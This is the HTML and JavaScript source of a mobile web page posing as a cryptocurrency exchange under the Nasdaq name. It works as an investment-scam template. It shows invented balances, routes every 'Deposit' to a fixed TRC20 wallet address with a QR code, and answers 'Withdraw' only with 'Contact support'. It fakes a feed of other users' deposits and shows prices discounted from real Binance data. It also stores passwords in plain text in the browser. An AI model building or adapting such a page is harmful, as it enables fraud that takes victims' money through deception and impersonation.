<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nasdaq Exchange</title>

<style>
body{margin:0;font-family:system-ui;background:#0b0e11;color:white;max-width:420px;margin:auto;}
.header{padding:15px;display:flex;justify-content:space-between;font-weight:bold;}
.card{background:#161a1e;margin:10px;padding:15px;border-radius:12px;}
.btn{background:#fcd535;border:none;padding:8px 10px;border-radius:8px;margin:2px;}
.coin{display:flex;justify-content:space-between;padding:12px;background:#161a1e;margin:6px;border-radius:10px;}
.nav{position:fixed;bottom:0;width:100%;max-width:420px;display:flex;background:#111;}
.nav div{flex:1;text-align:center;padding:10px;}
.page{display:none;}
.active{display:block;}
.popup{position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:999;padding:10px;}
input{width:100%;padding:10px;border:none;border-radius:8px;background:#222;color:white;}
.skeleton{height:50px;background:#222;margin:5px;border-radius:8px;animation:blink 1s infinite;}
@keyframes blink{0%{opacity:.5}50%{opacity:1}100%{opacity:.5}}
</style>
</head>

<body>

<div class="header">📊 Nasdaq Exchange 🔔</div>

<!-- LOGIN -->
<div id="login" class="page active">
<div class="card">
<input id="email" placeholder="Email"><br><br>
<input id="user" placeholder="Username"><br><br>
<input id="pass" type="password" placeholder="Password"><br><br>
<input id="cpass" type="password" placeholder="Confirm Password"><br><br>
<input id="ref" placeholder="Referral Code"><br><br>
<button class="btn" onclick="signup()">Signup</button>
<button class="btn" onclick="login()">Login</button>
</div>
</div>

<!-- HOME -->
<div id="home" class="page">
<div class="card">
<h2 id="bal">Balance: $1000</h2>
<button class="btn" onclick="buy()">Deposit</button>
</div>

<div class="card">
<h3>🔥 Hot Coins</h3>
<div id="hot"></div>
</div>
</div>

<!-- MARKET -->
<div id="market" class="page"></div>

<!-- ASSET -->
<div id="asset" class="page">
<div class="card">
<h3>Assets</h3>
<p id="bal2">$1000</p>
<button class="btn" onclick="buy()">Deposit</button>
<button class="btn" onclick="sell()">Withdraw</button>
<div id="activity"></div>
</div>
</div>

<!-- SUPPORT -->
<div id="support" class="page">
<div class="card">
<h3>Support</h3>
<p>Contact Admin</p>
</div>
</div>

<!-- NAV -->
<div class="nav">
<div onclick="show('home')">🏠</div>
<div onclick="show('market')">📊</div>
<div onclick="show('asset')">💰</div>
<div onclick="show('support')">📞</div>
</div>

<script>

// NAV
function show(p){
document.querySelectorAll(".page").forEach(x=>x.classList.remove("active"));
document.getElementById(p).classList.add("active");
}

// USERS
let users=JSON.parse(localStorage.getItem("users"))||{};
let admin="Goharjaan";

// SIGNUP
function signup(){
if(pass.value!==cpass.value)return alert("Password mismatch");
if(users[user.value])return alert("User exists");

let bal=1000;
if(ref.value==="@Ganjiwan@")bal+=20;

users[user.value]={password:pass.value,balance:bal};
localStorage.setItem("users",JSON.stringify(users));

alert("Signup done");
}

// LOGIN
function login(){
let u=user.value;
let p=pass.value;

if(!users[u])return alert("User not found");
if(users[u].password!==p)return alert("Wrong password");

localStorage.setItem("login",u);
update(u);
show("home");
}

// UPDATE
function update(u){
bal.innerText="Balance: $"+users[u].balance;
bal2.innerText="$"+users[u].balance;
}

// LOADING
function loading(){
let h="";
for(let i=0;i<6;i++){h+=`<div class="skeleton"></div>`;}
market.innerHTML=h;
}

// MARKET
let all=[];
async function load(){
loading();

let r=await fetch("https://api.binance.com/api/v3/ticker/24hr");
let d=await r.json();

all=d.filter(c=>c.symbol.endsWith("USDT"));
render(all);
}

// RENDER
function render(list){

let html=`<input placeholder="Search..." onkeyup="search(this.value)">`;

list.slice(0,200).forEach(c=>{
let price=(c.lastPrice*0.95).toFixed(2);
let col=c.priceChangePercent>=0?"lime":"red";

html+=`
<div class="coin" onclick="chart('${c.symbol}')">
<div>${c.symbol}<br><small style="color:${col}">${c.priceChangePercent}%</small></div>
<div>$${price}
<br>
<button onclick="event.stopPropagation();buy()">Buy</button>
<button onclick="event.stopPropagation();sell()">Sell</button>
</div>
</div>`;
});

market.innerHTML=html;
}

// SEARCH
function search(v){
let f=all.filter(c=>c.symbol.toLowerCase().includes(v.toLowerCase()));
render(f);
}

// CHART
function chart(s){
popup(`
<h2>${s}</h2>
<iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:${s}&theme=dark" width="100%" height="300"></iframe>
<button onclick="closeP()">Close</button>
`);
}

// WALLET
function buy(){
popup(`
<h2>TRC20 Wallet</h2>
<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm">
<p>TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm</p>
<button onclick="closeP()">Close</button>
`);
}

// SELL
function sell(){
alert("Contact support");
}

// POPUP
function popup(c){
let d=document.createElement("div");
d.className="popup";
d.innerHTML=c;
document.body.appendChild(d);
}
function closeP(){
document.querySelector(".popup").remove();
}

// ACTIVITY
setInterval(()=>{
activity.innerHTML+=`<p>Ali deposited $${Math.floor(Math.random()*2000)}</p>`;
},3000);

// START
load();

</script>

</body>
</html>
